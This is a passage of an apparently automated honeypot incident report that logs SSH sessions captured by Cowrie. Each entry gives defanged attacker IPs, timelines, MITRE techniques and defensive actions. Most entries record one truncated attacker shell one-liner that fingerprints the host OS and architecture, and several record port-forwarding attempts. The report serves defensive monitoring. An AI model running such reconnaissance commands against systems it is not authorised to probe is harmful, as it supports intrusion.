| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-08-12 02:09 |
| **Last Seen** | 2026-08-12 02:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:09:56` | `cowrie.session.connect` |
| `2026-08-12 02:09:56` | `cowrie.client.version` |
| `2026-08-12 02:09:56` | `cowrie.client.kex` |
| `2026-08-12 02:09:58` | `cowrie.login.success` |
| `2026-08-12 02:09:59` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfad2bb31646

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:10 |
| **Last Seen** | 2026-08-12 02:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:10:02` | `cowrie.session.connect` |
| `2026-08-12 02:10:03` | `cowrie.client.version` |
| `2026-08-12 02:10:03` | `cowrie.client.kex` |
| `2026-08-12 02:10:03` | `cowrie.login.success` |
| `2026-08-12 02:10:04` | `cowrie.session.params` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.success` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.command.input` |
| `2026-08-12 02:10:04` | `cowrie.log.closed` |
| `2026-08-12 02:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39a04da038d

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-08-12 02:10 |
| **Last Seen** | 2026-08-12 02:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:10:04` | `cowrie.session.connect` |
| `2026-08-12 02:10:05` | `cowrie.client.version` |
| `2026-08-12 02:10:05` | `cowrie.client.kex` |
| `2026-08-12 02:10:07` | `cowrie.login.success` |
| `2026-08-12 02:10:07` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c17f7711d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:11 |
| **Last Seen** | 2026-08-12 02:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:11:05` | `cowrie.session.connect` |
| `2026-08-12 02:11:05` | `cowrie.client.version` |
| `2026-08-12 02:11:05` | `cowrie.client.kex` |
| `2026-08-12 02:11:05` | `cowrie.login.success` |
| `2026-08-12 02:11:06` | `cowrie.session.params` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.success` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:06` | `cowrie.command.input` |
| `2026-08-12 02:11:07` | `cowrie.log.closed` |
| `2026-08-12 02:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d184cacc4d8c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:12 |
| **Last Seen** | 2026-08-12 02:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:12:06` | `cowrie.session.connect` |
| `2026-08-12 02:12:06` | `cowrie.client.version` |
| `2026-08-12 02:12:06` | `cowrie.client.kex` |
| `2026-08-12 02:12:07` | `cowrie.login.success` |
| `2026-08-12 02:12:08` | `cowrie.session.params` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.success` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.command.input` |
| `2026-08-12 02:12:08` | `cowrie.log.closed` |
| `2026-08-12 02:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21297ac0754

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:13 |
| **Last Seen** | 2026-08-12 02:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:13:09` | `cowrie.session.connect` |
| `2026-08-12 02:13:09` | `cowrie.client.version` |
| `2026-08-12 02:13:09` | `cowrie.client.kex` |
| `2026-08-12 02:13:10` | `cowrie.login.success` |
| `2026-08-12 02:13:11` | `cowrie.session.params` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.success` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.command.input` |
| `2026-08-12 02:13:11` | `cowrie.log.closed` |
| `2026-08-12 02:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-080c77e2bd93

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:14 |
| **Last Seen** | 2026-08-12 02:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:14:12` | `cowrie.session.connect` |
| `2026-08-12 02:14:12` | `cowrie.client.version` |
| `2026-08-12 02:14:12` | `cowrie.client.kex` |
| `2026-08-12 02:14:13` | `cowrie.login.success` |
| `2026-08-12 02:14:14` | `cowrie.session.params` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.success` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.command.input` |
| `2026-08-12 02:14:14` | `cowrie.log.closed` |
| `2026-08-12 02:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a39a1e58dcd

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-12 02:15 |
| **Last Seen** | 2026-08-12 02:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:15:07` | `cowrie.session.connect` |
| `2026-08-12 02:15:07` | `cowrie.client.version` |
| `2026-08-12 02:15:07` | `cowrie.client.kex` |
| `2026-08-12 02:15:09` | `cowrie.login.success` |
| `2026-08-12 02:15:10` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dcee4ecac65

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:15 |
| **Last Seen** | 2026-08-12 02:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:15:14` | `cowrie.session.connect` |
| `2026-08-12 02:15:14` | `cowrie.client.version` |
| `2026-08-12 02:15:14` | `cowrie.client.kex` |
| `2026-08-12 02:15:15` | `cowrie.login.success` |
| `2026-08-12 02:15:15` | `cowrie.session.params` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.success` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:15` | `cowrie.command.input` |
| `2026-08-12 02:15:16` | `cowrie.log.closed` |
| `2026-08-12 02:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05b63620af18

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-08-12 02:15 |
| **Last Seen** | 2026-08-12 02:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:15:15` | `cowrie.session.connect` |
| `2026-08-12 02:15:16` | `cowrie.client.version` |
| `2026-08-12 02:15:16` | `cowrie.client.kex` |
| `2026-08-12 02:15:17` | `cowrie.login.success` |
| `2026-08-12 02:15:17` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795dc2098fd0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:16 |
| **Last Seen** | 2026-08-12 02:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:16:12` | `cowrie.session.connect` |
| `2026-08-12 02:16:12` | `cowrie.client.version` |
| `2026-08-12 02:16:12` | `cowrie.client.kex` |
| `2026-08-12 02:16:12` | `cowrie.login.success` |
| `2026-08-12 02:16:13` | `cowrie.session.params` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.success` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.command.input` |
| `2026-08-12 02:16:13` | `cowrie.log.closed` |
| `2026-08-12 02:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8833fe778aa7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:17 |
| **Last Seen** | 2026-08-12 02:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:17:13` | `cowrie.session.connect` |
| `2026-08-12 02:17:13` | `cowrie.client.version` |
| `2026-08-12 02:17:14` | `cowrie.client.kex` |
| `2026-08-12 02:17:14` | `cowrie.login.success` |
| `2026-08-12 02:17:15` | `cowrie.session.params` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.success` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.command.input` |
| `2026-08-12 02:17:15` | `cowrie.log.closed` |
| `2026-08-12 02:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-990684c1f3fc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:18 |
| **Last Seen** | 2026-08-12 02:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:18:13` | `cowrie.session.connect` |
| `2026-08-12 02:18:13` | `cowrie.client.version` |
| `2026-08-12 02:18:14` | `cowrie.client.kex` |
| `2026-08-12 02:18:14` | `cowrie.login.success` |
| `2026-08-12 02:18:15` | `cowrie.session.params` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.success` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.command.input` |
| `2026-08-12 02:18:15` | `cowrie.log.closed` |
| `2026-08-12 02:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d36a9f869d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:19 |
| **Last Seen** | 2026-08-12 02:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:19:12` | `cowrie.session.connect` |
| `2026-08-12 02:19:13` | `cowrie.client.version` |
| `2026-08-12 02:19:13` | `cowrie.client.kex` |
| `2026-08-12 02:19:13` | `cowrie.login.success` |
| `2026-08-12 02:19:14` | `cowrie.session.params` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.success` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.command.input` |
| `2026-08-12 02:19:14` | `cowrie.log.closed` |
| `2026-08-12 02:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9da15bc866

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:20 |
| **Last Seen** | 2026-08-12 02:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
